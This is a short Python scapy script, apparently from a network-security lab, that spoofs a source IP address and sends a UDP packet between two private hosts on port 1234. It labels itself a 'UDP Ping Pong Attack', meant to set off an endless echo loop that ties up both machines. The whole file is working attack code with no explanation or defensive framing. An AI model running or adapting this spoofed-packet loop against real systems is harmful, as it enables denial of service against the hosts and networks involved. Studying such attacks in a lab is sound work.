#!/usr/bin/env python3

from scapy.all import *

def trigger_ping_pong_attack():
	print("[+] Triggering UDP Ping Pong Attack...")

	ip   = IP(src='192.168.33.135', dst='192.168.33.138')
	udp  = UDP(sport=1234, dport=1234)
	data = "Let's play some udp ping pong\n"
	pkt  = ip/udp/data
	send(pkt, verbose=0)

if __name__ == '__main__':
	trigger_ping_pong_attack()